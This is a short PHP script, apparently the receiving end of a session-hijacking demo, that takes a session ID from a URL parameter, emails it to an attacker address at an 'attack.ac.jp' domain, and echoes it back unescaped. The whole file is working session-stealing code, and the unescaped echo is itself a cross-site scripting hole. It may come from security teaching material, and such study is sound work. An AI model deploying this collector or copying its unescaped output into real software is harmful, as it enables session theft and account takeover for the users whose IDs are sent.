<?php
	mb_language("Japanese");
	mb_internal_encoding("UTF-8");
	$sessionid = $_GET["sessionid"];
	mb_send_mail("メールアドレスを入力","セッションIDだよ","SESSIONID:".$sessionid,"From: abcde@attack.ac.jp");
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>MAIL</title>
  </head>
  <body>
		<?php echo $sessionid;?>
  </body>
</html>
